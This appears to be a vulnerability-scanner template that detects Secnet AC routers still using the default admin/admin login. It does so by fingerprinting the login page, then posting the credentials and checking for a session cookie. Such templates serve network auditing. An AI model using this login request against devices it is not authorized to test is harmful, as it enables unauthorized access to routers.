id: poc-yaml-secnet-ac-default-password
info:
  name: Secnet Ac 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Secnet Ac
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /login.html
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "<title>安网科技-智能路由系统</title>")
  output: []
- method: POST
  path: /login.cgi
  headers: {}
  data: user=admin&password=admin
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "Set-Cookie") && contains(headers,
    "ac_userid=admin,ac_passwd=") && contains(body, "window.open('index.htm?_")
  output: []
